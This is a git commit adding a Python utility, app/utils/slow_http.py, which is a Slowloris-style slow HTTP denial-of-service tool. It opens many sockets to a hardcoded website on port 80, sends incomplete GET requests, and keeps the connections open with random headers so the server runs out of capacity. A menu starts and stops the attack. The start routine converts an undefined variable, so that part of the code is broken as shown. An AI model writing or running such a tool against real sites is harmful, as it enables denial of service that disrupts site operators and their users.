31863e30cf1f6f9a687bbf1db84826c44187f23c
Asim Sabic <asabic@domain.local>
2019-02-14 13:13:07 +0100

    Slow http implementation

---
+++ app/utils/slow_http.py
@@ -0,0 +1,93 @@
+import random
+import socket
+import string
+import time
+import sys
+from threading import Thread
+from colorama import init, Fore, Back, Style
+
+
+#Global variables
+ongoing = True
+
+
+def init_request(url: str, port: int) -> socket:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    host = socket.gethostname()
+    print (socket.gethostbyname(url))
+    print ('Connecting to ', url, port, ongoing)
+    s.connect((url, port))
+
+    s.send(b"GET / HTTP/1.1\r\n")
+    return s
+
+
+def start_slow_http_attack(url: str,
+                           port: int,
+                           workers_count: int = 1000) -> None:
+    global ongoing
+    sockets = [init_request(url, port) for _ in range(workers_count) if ongoing]
+    ongoing = True
+
+    while ongoing:
+        for i, s in enumerate(sockets):
+            try:
+                # check a connection by sending a random header
+                header = "%s: %s\r\n" % (random.choice(string.ascii_letters), random.randint(1, 99999))
+                s.send(header.encode('utf-8'))
+            except socket.error:
+                # recreate a dead socket
+                sockets[i] = init_request(url, port)
+        time.sleep(30)
+
+
+def stop_slow_http_attack() -> None: 
+    global ongoing
+    ongoing = False
+
+
+def start_attack() -> None:
+    number_of_workers = 0
+    while True:
+        worker_input = input('Insert number of workers: ')
+        try:
+            number_of_workers = int(season_input)
+            break
+        except:
+            print('Must be a number!!')
+    thread = Thread(target = start_slow_http_attack, args = ('rtrkblhrana.com', 80, number_of_workers))
+    thread.start()
+
+
+def exit() -> None:
+    global ongoing
+    ongoing = False
+    sys.exit(0)
+
+
+def main () -> None:
+    global driver
+
+    menu_options = [{'name': "exit",                        'function': exit},
+                    {'name': "start_attack",                'function': start_attack},
+                    {'name': "stop_slow_http_attack",       'function': stop_slow_http_attack}]
+
+    print()
+    print('Choose the option: ')
+    for item in menu_options:
+        print("[ " + str(menu_options.index(item)) + " ]\t" + item["name"])
+    while(True):
+        choice = input("\nEnter choice number: ")
+        if(choice.isdigit()):
+            if(0 <= int(choice) < len(menu_options)):
+                menu_options[int(choice)]['function']()
+            else:
+                print("Number out range!")
+        else:
+            print("Not a valid input!")
+    print(Fore.GREEN + Style.BRIGHT + "Completed.")
+    sys.exit(0)
+
+
+if __name__ == '__main__':
+    main()
